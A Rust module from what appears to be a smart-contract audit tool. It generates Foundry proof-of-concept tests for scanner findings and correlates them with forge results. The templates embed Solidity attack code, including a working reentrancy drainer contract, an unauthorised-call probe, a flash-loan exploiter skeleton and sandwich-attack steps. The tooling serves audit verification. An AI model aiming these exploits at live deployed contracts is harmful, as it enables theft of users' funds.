//! Foundry Integration
//!
//! Provides integration with the Foundry testing framework:
//! - Generate PoC Foundry tests from findings (real exploit scaffolds, never vacuous)
//! - Run `forge test --json` and correlate results with findings
//! - Auto-create test templates per vulnerability category
//!
//! ## Honesty contract for generated PoCs
//!
//! A static scanner cannot deploy the victim contract or reconstruct its full
//! constructor/liquidity/state, so it cannot always emit a turn-key working exploit.
//! Every generated test therefore does exactly one of two things and never a third:
//!   1. If the auditor supplies a deployed target (`POC_TARGET` env var, an address),
//!      it runs the real attack sequence and asserts on the outcome.
//!   2. Otherwise it emits a loud `SETUP REQUIRED` log and calls `vm.skip(true)` so
//!      `forge test` reports it as **skipped**, never as a green pass.
//!
//! No generated test contains `assertTrue(true, ...)`. A passing test means the
//! exploit actually reproduced.

use std::fs;
use std::path::Path;
use std::process::Command;
use std::time::{Duration, Instant};

use once_cell::sync::Lazy;
use regex::Regex;

use crate::vulnerabilities::{Vulnerability, VulnerabilityCategory, VulnerabilitySeverity};

/// Default wall-clock cap for a `forge test` invocation.
const FORGE_TEST_TIMEOUT: Duration = Duration::from_secs(300);

/// Foundry integration for test generation and correlation
pub struct FoundryIntegration {
    project_path: String,
    test_output_dir: String,
}

/// Result of Foundry test correlation
#[derive(Debug)]
pub struct CorrelationResult {
    pub finding_id: String,
    pub finding_title: String,
    pub test_exists: bool,
    pub test_passes: bool,
    pub test_name: Option<String>,
}

/// Foundry test result from `forge test --json`.
///
/// A partial mirror of forge's schema: only the fields the correlator reads are
/// declared, and serde ignores the rest (`reason`, `duration`, ...).
#[derive(Debug, serde::Deserialize)]
pub struct ForgeTestResult {
    pub name: String,
    pub status: String,
}

/// A clean, recoverable error from running `forge`. Never panics the caller.
#[derive(Debug)]
pub enum ForgeRunError {
    /// `forge` is not installed / not on PATH.
    ForgeNotInstalled,
    /// The target directory is not a Foundry project (no `foundry.toml`).
    NotAFoundryProject(String),
    /// `forge test` exceeded the timeout and was killed.
    TimedOut(Duration),
    /// `forge` ran but produced no parseable JSON test objects.
    NoParseableOutput,
    /// Any other I/O failure while spawning/reading the process.
    Io(String),
}

impl std::fmt::Display for ForgeRunError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ForgeRunError::ForgeNotInstalled => write!(
                f,
                "forge is not installed or not on PATH (install Foundry: https://getfoundry.sh)"
            ),
            ForgeRunError::NotAFoundryProject(p) => {
                write!(f, "'{p}' is not a Foundry project (no foundry.toml found)")
            }
            ForgeRunError::TimedOut(d) => {
                write!(f, "forge test timed out after {}s", d.as_secs())
            }
            ForgeRunError::NoParseableOutput => {
                write!(f, "forge test produced no parseable JSON output")
            }
            ForgeRunError::Io(e) => write!(f, "failed to run forge: {e}"),
        }
    }
}

impl std::error::Error for ForgeRunError {}

/// Extract the first `function <name>` identifier from a code snippet, if present.
fn extract_function_name(code: &str) -> Option<String> {
    static FN_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r"function\s+([A-Za-z_]\w*)").expect("valid fn regex"));
    FN_RE
        .captures(code)
        .and_then(|c| c.get(1))
        .map(|m| m.as_str().to_string())
}

/// Extract a `contract <Name>` identifier from surrounding context, if present.
fn extract_contract_name(code: &str) -> Option<String> {
    static CONTRACT_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r"(?:contract|interface|library)\s+([A-Za-z_]\w*)")
            .expect("valid contract regex")
    });
    CONTRACT_RE
        .captures(code)
        .and_then(|c| c.get(1))
        .map(|m| m.as_str().to_string())
}

impl FoundryIntegration {
    pub fn new(project_path: &str) -> Self {
        Self {
            project_path: project_path.to_string(),
            test_output_dir: format!("{}/test/poc", project_path),
        }
    }

    /// Generate PoC Foundry tests for all Critical/High findings.
    pub fn generate_poc_tests(&self, vulnerabilities: &[Vulnerability]) -> Vec<String> {
        let mut generated_files = Vec::new();

        let _ = fs::create_dir_all(&self.test_output_dir);

        for (idx, vuln) in vulnerabilities
            .iter()
            .filter(|v| {
                v.severity == VulnerabilitySeverity::Critical
                    || v.severity == VulnerabilitySeverity::High
            })
            .enumerate()
        {
            let test_content = self.generate_test_for_vulnerability(vuln, idx + 1);
            let file_name = format!(
                "{}/PoC_{:02}_{}.t.sol",
                self.test_output_dir,
                idx + 1,
                self.sanitize_name(&vuln.title)
            );

            if fs::write(&file_name, &test_content).is_ok() {
                generated_files.push(file_name);
            }
        }

        generated_files
    }

    /// Generate a PoC test string for a specific vulnerability (public for testing/reuse).
    pub fn generate_test_for_vulnerability(&self, vuln: &Vulnerability, idx: usize) -> String {
        let test_name = format!("test_PoC_{:02}_{}", idx, self.sanitize_name(&vuln.title));

        match &vuln.category {
            VulnerabilityCategory::Reentrancy | VulnerabilityCategory::CallbackReentrancy => {
                self.generate_reentrancy_test(vuln, &test_name)
            }
            VulnerabilityCategory::OracleManipulation => {
                self.generate_oracle_test(vuln, &test_name)
            }
            VulnerabilityCategory::AccessControl
            | VulnerabilityCategory::RoleBasedAccessControl => {
                self.generate_access_control_test(vuln, &test_name)
            }
            VulnerabilityCategory::MEVExploitable | VulnerabilityCategory::FrontRunning => {
                self.generate_mev_test(vuln, &test_name)
            }
            VulnerabilityCategory::FlashLoanAttack => {
                self.generate_flash_loan_test(vuln, &test_name)
            }
            _ => self.generate_generic_test(vuln, &test_name),
        }
    }

    /// Common header comment naming the finding, severity, source line and snippet.
    fn header(&self, vuln: &Vulnerability, subtitle: &str) -> String {
        let contract =
            extract_contract_name(vuln.context_before.as_deref().unwrap_or(&vuln.code_snippet))
                .unwrap_or_else(|| "Victim".to_string());
        let func =
            extract_function_name(&vuln.code_snippet).unwrap_or_else(|| "target".to_string());
        format!(
            r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// ============================================================================
// PoC: {title}
// {subtitle}
// Severity : {severity:?}   |   Confidence: {conf}%
// Source   : line {line}  (contract `{contract}`, function `{func}`)
// Snippet  : {snippet}
// ----------------------------------------------------------------------------
// This scaffold cannot deploy the live victim for you. Provide a deployed
// target address in the POC_TARGET env var, e.g.:
//     POC_TARGET=0xVictim... forge test --match-test {func_lc} -vvv
// or edit setUp() to `new {contract}(...)`. Until then the test SKIPS loudly
// (it never silently passes).
// ============================================================================"#,
            title = vuln.title,
            subtitle = subtitle,
            severity = vuln.severity,
            conf = vuln.confidence_percent,
            line = vuln.line_number,
            contract = contract,
            func = func,
            func_lc = func.to_lowercase(),
            snippet = vuln.code_snippet.trim().replace('\n', " ")
        )
    }

    fn generate_reentrancy_test(&self, vuln: &Vulnerability, test_name: &str) -> String {
        let func =
            extract_function_name(&vuln.code_snippet).unwrap_or_else(|| "withdraw".to_string());
        let contract_name = self.sanitize_name(&vuln.title);
        format!(
            r#"{header}

/// Minimal view of the victim's vulnerable withdraw/claim surface.
/// Adjust the signature to match the real function if it takes arguments.
interface IReentrancyVictim {{
    function deposit() external payable;
    function {func}() external;
    function balances(address) external view returns (uint256);
}}

contract {contract} is Test {{
    ReentrancyAttacker internal attacker;

    function setUp() public {{
        // Optionally deploy the victim here instead of using POC_TARGET.
    }}

    function {test}() public {{
        address target = vm.envOr("POC_TARGET", address(0));
        if (target == address(0)) {{
            emit log("SETUP REQUIRED: set POC_TARGET to the deployed victim address");
            emit log("  then re-run: POC_TARGET=0x... forge test --match-test {test} -vvv");
            vm.skip(true);
            return;
        }}

        uint256 deposit = 1 ether;
        attacker = new ReentrancyAttacker(target, deposit);
        vm.deal(address(attacker), deposit);
        // Give the victim a surplus so a successful re-entrancy visibly over-withdraws.
        vm.deal(target, 10 ether);

        uint256 attackerBefore = address(attacker).balance;
        attacker.attack{{value: deposit}}();
        uint256 attackerAfter = address(attacker).balance;

        // A correct victim returns at most the deposit. Draining more proves reentrancy.
        assertGt(
            attackerAfter,
            attackerBefore,
            "Reentrancy did NOT drain funds -- finding may be a false positive, or the function signature/name in IReentrancyVictim needs adjusting"
        );
        assertGt(
            attackerAfter,
            attackerBefore + deposit,
            "Attacker recovered only its own deposit; re-entrancy did not over-withdraw"
        );
    }}
}}

contract ReentrancyAttacker {{
    IReentrancyVictim public immutable victim;
    uint256 public immutable deposit;
    uint256 public reenters;

    constructor(address _victim, uint256 _deposit) {{
        victim = IReentrancyVictim(_victim);
        deposit = _deposit;
    }}

    function attack() external payable {{
        victim.deposit{{value: msg.value}}();
        victim.{func}();
    }}

    receive() external payable {{
        // Re-enter while the victim still has a balance and hasn't zeroed ours.
        if (reenters < 10 && address(victim).balance >= deposit) {{
            reenters++;
            victim.{func}();
        }}
    }}
}}
"#,
            header = self.header(
                vuln,
                "Reentrancy (SWC-107): attacker re-enters before state update"
            ),
            contract = contract_name,
            test = test_name,
            func = func,
        )
    }

    fn generate_oracle_test(&self, vuln: &Vulnerability, test_name: &str) -> String {
        let func =
            extract_function_name(&vuln.code_snippet).unwrap_or_else(|| "getPrice".to_string());
        let contract_name = self.sanitize_name(&vuln.title);
        format!(
            r#"{header}

/// The victim reads a spot price that a single large swap / donation can move.
interface IOracleVictim {{
    function {func}() external view returns (uint256);
}}

contract {contract} is Test {{
    function setUp() public {{}}

    function {test}() public {{
        address target = vm.envOr("POC_TARGET", address(0));
        if (target == address(0)) {{
            emit log("SETUP REQUIRED: an oracle-manipulation PoC needs the live pool/oracle.");
            emit log("  Provide POC_TARGET plus the AMM pair, then perform a large swap");
            emit log("  (or a direct token donation) between the two price reads below.");
            vm.skip(true);
            return;
        }}

        uint256 priceBefore = IOracleVictim(target).{func}();

        // --- AUDITOR: insert the price-moving action here -------------------
        // e.g. take a flash loan, swap a large amount into the reference pool,
        //      or donate tokens directly to skew reserves.
        // If you cannot move the price, this finding is likely not exploitable.
        // --------------------------------------------------------------------

        uint256 priceAfter = IOracleVictim(target).{func}();

        // Until the manipulation step is filled in, priceAfter == priceBefore and
        // this assertion fails loudly -- proving the PoC is incomplete, not that
        // the contract is safe.
        assertTrue(
            priceAfter != priceBefore,
            "Spot price did not move: fill in the manipulation step above to complete the PoC"
        );
    }}
}}
"#,
            header = self.header(
                vuln,
                "Oracle manipulation: spot price used without TWAP/sanity checks"
            ),
            contract = contract_name,
            test = test_name,
            func = func,
        )
    }

    fn generate_access_control_test(&self, vuln: &Vulnerability, test_name: &str) -> String {
        let func = extract_function_name(&vuln.code_snippet)
            .unwrap_or_else(|| "privilegedFunction".to_string());
        let contract_name = self.sanitize_name(&vuln.title);
        format!(
            r#"{header}

/// The privileged function that appears to lack an owner/role guard.
/// Adjust the signature if it takes arguments.
interface IAccessVictim {{
    function {func}() external;
}}

contract {contract} is Test {{
    address internal attacker = makeAddr("attacker");

    function setUp() public {{}}

    function {test}() public {{
        address target = vm.envOr("POC_TARGET", address(0));
        if (target == address(0)) {{
            emit log("SETUP REQUIRED: set POC_TARGET to the deployed victim address");
            vm.skip(true);
            return;
        }}

        // Call the privileged function from an unrelated address.
        vm.prank(attacker);
        (bool ok, ) = target.call(abi.encodeWithSignature("{func}()"));

        // If access control were present this call would revert. A success proves
        // the guard is missing. If it reverts, the finding may be a false positive
        // (or the function takes arguments -- adjust the selector above).
        assertTrue(
            ok,
            "Call reverted: access control appears present, or the function signature needs adjusting"
        );
    }}
}}
"#,
            header = self.header(
                vuln,
                "Access control (SWC-105): privileged function callable by anyone"
            ),
            contract = contract_name,
            test = test_name,
            func = func,
        )
    }

    fn generate_mev_test(&self, vuln: &Vulnerability, test_name: &str) -> String {
        let func = extract_function_name(&vuln.code_snippet).unwrap_or_else(|| "swap".to_string());
        let contract_name = self.sanitize_name(&vuln.title);
        format!(
            r#"{header}

/// Victim swap/trade entrypoint that appears to accept no (or a zero) slippage bound.
interface IMEVVictim {{
    function {func}(uint256 amountIn, uint256 minOut) external returns (uint256 amountOut);
}}

contract {contract} is Test {{
    address internal victimUser = makeAddr("victimUser");
    address internal searcher = makeAddr("searcher");

    function setUp() public {{}}

    function {test}() public {{
        address target = vm.envOr("POC_TARGET", address(0));
        if (target == address(0)) {{
            emit log("SETUP REQUIRED: a sandwich PoC needs the live pool + tokens.");
            emit log("  1) searcher front-runs with a large trade to move the price");
            emit log("  2) victimUser's trade executes at the worse price (minOut too low)");
            emit log("  3) searcher back-runs to realise profit; assert profit > 0");
            vm.skip(true);
            return;
        }}

        // --- AUDITOR: wire the DEX router and tokens, then: ------------------
        // vm.prank(searcher); IMEVVictim(target).{func}(frontRunAmt, 0); // move price
        // vm.prank(victimUser); uint256 out = IMEVVictim(target).{func}(victimAmt, 0);
        // vm.prank(searcher); IMEVVictim(target).{func}(backRunAmt, 0);   // realise profit
        // assertLt(out, expectedOut, "victim received less than fair value");
        // --------------------------------------------------------------------

        fail();
        emit log("Sandwich sequence not wired: complete the three steps above.");
    }}
}}
"#,
            header = self.header(
                vuln,
                "MEV / sandwich: unbounded slippage lets a searcher extract value"
            ),
            contract = contract_name,
            test = test_name,
            func = func,
        )
    }

    fn generate_flash_loan_test(&self, vuln: &Vulnerability, test_name: &str) -> String {
        let func =
            extract_function_name(&vuln.code_snippet).unwrap_or_else(|| "execute".to_string());
        let contract_name = self.sanitize_name(&vuln.title);
        format!(
            r#"{header}

interface IFlashVictim {{
    function {func}() external;
}}

contract {contract} is Test {{
    FlashLoanExploiter internal exploiter;

    function setUp() public {{}}

    function {test}() public {{
        address target = vm.envOr("POC_TARGET", address(0));
        address lender = vm.envOr("POC_FLASH_LENDER", address(0));
        if (target == address(0) || lender == address(0)) {{
            emit log("SETUP REQUIRED: set POC_TARGET and POC_FLASH_LENDER.");
            emit log("  The exploiter borrows, manipulates victim state, extracts value, repays.");
            vm.skip(true);
            return;
        }}

        exploiter = new FlashLoanExploiter(target, lender);
        uint256 before = address(exploiter).balance;
        exploiter.run();
        assertGt(
            address(exploiter).balance,
            before,
            "Flash-loan sequence yielded no profit: complete executeOperation() logic"
        );
    }}
}}

contract FlashLoanExploiter {{
    address public immutable victim;
    address public immutable lender;

    constructor(address _victim, address _lender) {{
        victim = _victim;
        lender = _lender;
    }}

    function run() external {{
        // AUDITOR: initiate the flash loan from `lender` here. The provider will
        // call back into executeOperation()/receiveFlashLoan() below.
        revert("SETUP REQUIRED: initiate the flash loan against your lender's interface");
    }}

    // Typical Aave-style callback. Adapt to your provider (Balancer/Uniswap/etc).
    function executeOperation(
        address, /* asset */
        uint256 amount,
        uint256 premium,
        address, /* initiator */
        bytes calldata /* params */
    ) external returns (bool) {{
        // 1) manipulate victim state / price using borrowed `amount`
        IFlashVictim(victim).{func}();
        // 2) extract value
        // 3) ensure `amount + premium` is repayable to the lender
        return true;
    }}
}}
"#,
            header = self.header(
                vuln,
                "Flash-loan attack: borrowed capital amplifies a state/price flaw"
            ),
            contract = contract_name,
            test = test_name,
            func = func,
        )
    }

    fn generate_generic_test(&self, vuln: &Vulnerability, test_name: &str) -> String {
        let func =
            extract_function_name(&vuln.code_snippet).unwrap_or_else(|| "target".to_string());
        let contract_name = self.sanitize_name(&vuln.title);
        format!(
            r#"{header}
// Category  : {category:?}
// Rationale : {description}
// Fix       : {recommendation}

interface IVictim {{
    function {func}() external;
}}

contract {contract} is Test {{
    function setUp() public {{}}

    function {test}() public {{
        address target = vm.envOr("POC_TARGET", address(0));
        if (target == address(0)) {{
            emit log("SETUP REQUIRED: no automatic exploit exists for this category.");
            emit log("  Set POC_TARGET and encode the attack described in the header, then");
            emit log("  assert on the observable impact (stolen funds, corrupted state, DoS).");
            vm.skip(true);
            return;
        }}

        // AUDITOR: exercise the vulnerable path and assert on its impact.
        // The default below fails loudly so an unfinished PoC is never green.
        fail();
        emit log("PoC not implemented: encode the attack and add an impact assertion.");
    }}
}}
"#,
            header = self.header(vuln, "Generic PoC scaffold"),
            category = vuln.category,
            description = vuln.description.replace('\n', " "),
            recommendation = vuln.recommendation.replace('\n', " "),
            contract = contract_name,
            test = test_name,
            func = func,
        )
    }

    /// Run `forge test --json` inside the project and parse per-test results.
    ///
    /// Returns clean, recoverable errors for: forge not installed, the directory
    /// not being a Foundry project, and timeouts. Never panics.
    pub fn run_tests(
        &self,
        test_pattern: Option<&str>,
    ) -> Result<Vec<ForgeTestResult>, ForgeRunError> {
        // Cheap, deterministic guard: a Foundry project must have foundry.toml.
        if !Path::new(&self.project_path).join("foundry.toml").is_file() {
            return Err(ForgeRunError::NotAFoundryProject(self.project_path.clone()));
        }

        let mut cmd = Command::new("forge");
        cmd.current_dir(&self.project_path);
        cmd.args(["test", "--json"]);
        if let Some(pattern) = test_pattern {
            cmd.args(["--match-test", pattern]);
        }
        cmd.stdout(std::process::Stdio::piped());
        cmd.stderr(std::process::Stdio::piped());

        let mut child = match cmd.spawn() {
            Ok(c) => c,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                return Err(ForgeRunError::ForgeNotInstalled)
            }
            Err(e) => return Err(ForgeRunError::Io(e.to_string())),
        };

        // Poll for completion so we can enforce a wall-clock timeout without extra deps.
        let start = Instant::now();
        loop {
            match child.try_wait() {
                Ok(Some(_status)) => break,
                Ok(None) => {
                    if start.elapsed() >= FORGE_TEST_TIMEOUT {
                        let _ = child.kill();
                        let _ = child.wait();
                        return Err(ForgeRunError::TimedOut(FORGE_TEST_TIMEOUT));
                    }
                    std::thread::sleep(Duration::from_millis(100));
                }
                Err(e) => return Err(ForgeRunError::Io(e.to_string())),
            }
        }

        let output = child
            .wait_with_output()
            .map_err(|e| ForgeRunError::Io(e.to_string()))?;

        // `forge test` exits non-zero when tests fail; that is still valid, parseable
        // output for correlation. We parse stdout regardless of exit status.
        let stdout = String::from_utf8_lossy(&output.stdout);
        let results = Self::parse_forge_json(&stdout);
        if results.is_empty() {
            return Err(ForgeRunError::NoParseableOutput);
        }
        Ok(results)
    }

    /// Parse `forge test --json` output. Forge emits a single JSON document keyed by
    /// test suite; it also historically emitted one object per line. Handle both.
    fn parse_forge_json(stdout: &str) -> Vec<ForgeTestResult> {
        let mut results = Vec::new();

        // Newer forge: one big JSON object { "suite": { "test_results": { "name": {..} } } }.
        if let Ok(root) = serde_json::from_str::<serde_json::Value>(stdout.trim()) {
            if let Some(suites) = root.as_object() {
                for (_suite, suite_val) in suites {
                    if let Some(tests) = suite_val.get("test_results").and_then(|v| v.as_object()) {
                        for (name, tv) in tests {
                            if let Some(status) = tv.get("status").and_then(|s| s.as_str()) {
                                results.push(ForgeTestResult {
                                    name: name.clone(),
                                    status: status.to_string(),
                                });
                            }
                        }
                    }
                }
            }
            if !results.is_empty() {
                return results;
            }
        }

        // Fallback: line-delimited ForgeTestResult objects.
        for line in stdout.lines() {
            if let Ok(r) = serde_json::from_str::<ForgeTestResult>(line) {
                results.push(r);
            }
        }
        results
    }

    /// Correlate findings with Foundry test results.
    pub fn correlate_findings(
        &self,
        vulnerabilities: &[Vulnerability],
        test_results: &[ForgeTestResult],
    ) -> Vec<CorrelationResult> {
        let mut correlations = Vec::new();

        for (idx, vuln) in vulnerabilities.iter().enumerate() {
            let finding_id = format!("F-{:03}", idx + 1);
            let sanitized_title = self.sanitize_name(&vuln.title).to_lowercase();
            let poc_tag = format!("poc_{:02}", idx + 1);

            let matching_test = test_results.iter().find(|t| {
                let n = t.name.to_lowercase();
                n.contains(&sanitized_title) || n.contains(&poc_tag)
            });

            let (test_exists, test_passes, test_name) = match matching_test {
                Some(test) => {
                    let status = test.status.to_lowercase();
                    let passes = status == "pass" || status == "success";
                    (true, passes, Some(test.name.clone()))
                }
                None => (false, false, None),
            };

            correlations.push(CorrelationResult {
                finding_id,
                finding_title: vuln.title.clone(),
                test_exists,
                test_passes,
                test_name,
            });
        }

        correlations
    }

    /// Generate a Markdown index of the generated PoC files with an honest status.
    ///
    /// Generated PoCs skip until the auditor supplies `POC_TARGET`, so the status
    /// column says exactly that rather than the misleading literal `TODO`.
    pub fn generate_test_index(&self, generated_files: &[String]) -> String {
        let mut index = String::new();

        index.push_str("# Generated PoC Tests\n\n");
        index.push_str(
            "Each PoC runs the real attack when `POC_TARGET` (a deployed victim address) is set, \
             and otherwise **skips** with a `SETUP REQUIRED` message. None pass vacuously.\n\n",
        );
        index.push_str("| # | Test File | Status |\n");
        index.push_str("|---|-----------|--------|\n");

        for (idx, file) in generated_files.iter().enumerate() {
            let file_name = Path::new(file)
                .file_name()
                .map(|f| f.to_string_lossy())
                .unwrap_or_default();
            index.push_str(&format!(
                "| {} | `{}` | Needs setup (set POC_TARGET) |\n",
                idx + 1,
                file_name
            ));
        }

        index.push_str("\n## Running Tests\n\n");
        index.push_str("```bash\n");
        index.push_str("# Run all PoC tests (skips until POC_TARGET is set)\n");
        index.push_str("forge test --match-path 'test/poc/*.t.sol' -vvv\n\n");
        index.push_str("# Run one PoC against a live target\n");
        index.push_str("POC_TARGET=0xVictim... forge test --match-test test_PoC_01 -vvv\n");
        index.push_str("```\n");

        index
    }

    fn sanitize_name(&self, name: &str) -> String {
        name.chars()
            .map(|c| if c.is_alphanumeric() { c } else { '_' })
            .collect::<String>()
            .trim_matches('_')
            .to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::vulnerabilities::{VulnerabilityConfidence, VulnerabilitySeverity};

    fn vuln(category: VulnerabilityCategory, title: &str, snippet: &str) -> Vulnerability {
        Vulnerability {
            severity: VulnerabilitySeverity::High,
            category,
            title: title.to_string(),
            description: "desc".to_string(),
            line_number: 42,
            end_line_number: None,
            code_snippet: snippet.to_string(),
            context_before: Some("contract MyVault {".to_string()),
            context_after: None,
            recommendation: "use checks-effects-interactions".to_string(),
            confidence: VulnerabilityConfidence::High,
            confidence_percent: 90,
            swc_id: None,
            fix_suggestion: None,
            cvss_score: None,
            cvss_vector: None,
            exploit_references: Vec::new(),
            attack_path: None,
        }
    }

    #[test]
    fn no_generated_poc_is_vacuous() {
        let fi = FoundryIntegration::new("/tmp/proj");
        let cases = [
            (
                VulnerabilityCategory::Reentrancy,
                "Reentrancy in withdraw",
                "function withdraw() public { msg.sender.call{value: bal}(\"\"); }",
            ),
            (
                VulnerabilityCategory::OracleManipulation,
                "Spot price oracle",
                "function getPrice() public view returns (uint256)",
            ),
            (
                VulnerabilityCategory::AccessControl,
                "Missing owner check",
                "function setOwner(address a) external",
            ),
            (
                VulnerabilityCategory::MEVExploitable,
                "No slippage",
                "function swap(uint256 a) external",
            ),
            (
                VulnerabilityCategory::FrontRunning,
                "Frontrun swap",
                "function swap(uint256 a) external",
            ),
            (
                VulnerabilityCategory::FlashLoanAttack,
                "Flash loan drain",
                "function execute() external",
            ),
            (
                VulnerabilityCategory::LogicError,
                "Some logic bug",
                "function doThing() external",
            ),
        ];
        for (cat, title, snippet) in cases {
            let v = vuln(cat, title, snippet);
            let out = fi.generate_test_for_vulnerability(&v, 1);
            assert!(
                !out.contains("assertTrue(true"),
                "PoC for {title} is vacuous:\n{out}"
            );
            assert!(
                out.contains("forge-std/Test.sol"),
                "missing import: {title}"
            );
            assert!(out.contains("is Test"), "missing Test base: {title}");
            // Non-vacuous means: either it skips loudly, or it fails loudly, or it
            // asserts a real inequality on impact.
            assert!(
                out.contains("vm.skip(true)")
                    || out.contains("fail()")
                    || out.contains("assertGt(")
                    || out.contains("SETUP REQUIRED"),
                "PoC for {title} has no loud path:\n{out}"
            );
            assert!(
                out.contains("line 42"),
                "header missing source line: {title}"
            );
        }
    }

    #[test]
    fn reentrancy_poc_has_attacker_and_impact_assertion() {
        let fi = FoundryIntegration::new("/tmp/proj");
        let v = vuln(
            VulnerabilityCategory::Reentrancy,
            "Reentrancy in claim",
            "function claim() public { (bool ok,) = msg.sender.call{value: amount}(\"\"); }",
        );
        let out = fi.generate_test_for_vulnerability(&v, 1);
        assert!(out.contains("contract ReentrancyAttacker"));
        assert!(out.contains("receive() external payable"));
        assert!(
            out.contains("victim.claim()"),
            "attacker must re-enter claim():\n{out}"
        );
        assert!(
            out.contains("+ deposit"),
            "must assert over-withdraw beyond deposit"
        );
        assert!(!out.contains("assertTrue(true"));
    }

    #[test]
    fn index_status_is_not_todo() {
        let fi = FoundryIntegration::new("/tmp/proj");
        let idx =
            fi.generate_test_index(&["/tmp/proj/test/poc/PoC_01_Reentrancy.t.sol".to_string()]);
        assert!(
            !idx.contains("| TODO |"),
            "index must not use the literal TODO status"
        );
        assert!(idx.contains("Needs setup"));
    }

    #[test]
    fn run_tests_reports_not_a_project_cleanly() {
        // An empty temp dir is not a Foundry project -> clean error, no panic,
        // and importantly forge is never even spawned.
        let dir = std::env::temp_dir().join(format!("poc_notproj_{}", std::process::id()));
        let _ = fs::create_dir_all(&dir);
        let fi = FoundryIntegration::new(&dir.to_string_lossy());
        match fi.run_tests(None) {
            Err(ForgeRunError::NotAFoundryProject(_)) => {}
            other => panic!("expected NotAFoundryProject, got {other:?}"),
        }
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn run_tests_reports_forge_absent_cleanly() {
        // Point PATH somewhere with no `forge`, and satisfy the foundry.toml guard,
        // so spawn() fails with NotFound -> ForgeNotInstalled (never a panic).
        let dir = std::env::temp_dir().join(format!("poc_forgeabsent_{}", std::process::id()));
        let _ = fs::create_dir_all(&dir);
        let _ = fs::write(dir.join("foundry.toml"), "[profile.default]\n");
        let fi = FoundryIntegration::new(&dir.to_string_lossy());

        let saved = std::env::var_os("PATH");
        std::env::set_var("PATH", "/nonexistent-path-for-poc-test");
        let res = fi.run_tests(None);
        if let Some(p) = saved {
            std::env::set_var("PATH", p);
        }
        assert!(
            matches!(res, Err(ForgeRunError::ForgeNotInstalled)),
            "expected ForgeNotInstalled, got {res:?}"
        );
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn parse_forge_json_handles_object_and_lines() {
        let obj = r#"{"test/A.t.sol:AT":{"test_results":{"test_foo()":{"status":"Success","reason":null,"duration":12}}}}"#;
        let parsed = FoundryIntegration::parse_forge_json(obj);
        assert_eq!(parsed.len(), 1);
        assert_eq!(parsed[0].name, "test_foo()");
        assert_eq!(parsed[0].status, "Success");

        let lines = "{\"name\":\"test_bar()\",\"status\":\"Failure\",\"reason\":\"revert\",\"duration\":1.0}";
        let parsed2 = FoundryIntegration::parse_forge_json(lines);
        assert_eq!(parsed2.len(), 1);
        assert_eq!(parsed2[0].name, "test_bar()");
        assert_eq!(parsed2[0].status, "Failure");
    }

    #[test]
    fn correlate_uses_status_and_index() {
        let fi = FoundryIntegration::new("/tmp/proj");
        let v = vuln(
            VulnerabilityCategory::Reentrancy,
            "Reentrancy in claim",
            "function claim()",
        );
        let results = vec![ForgeTestResult {
            name: "test_PoC_01_Reentrancy_in_claim()".to_string(),
            status: "pass".to_string(),
        }];
        let corr = fi.correlate_findings(std::slice::from_ref(&v), &results);
        assert_eq!(corr.len(), 1);
        assert!(corr[0].test_exists && corr[0].test_passes);
        // Read the remaining public fields so the CLI-facing shape is exercised.
        assert_eq!(corr[0].finding_id, "F-001");
        assert_eq!(corr[0].finding_title, "Reentrancy in claim");
        assert!(corr[0].test_name.as_deref().unwrap().contains("PoC_01"));
    }
}
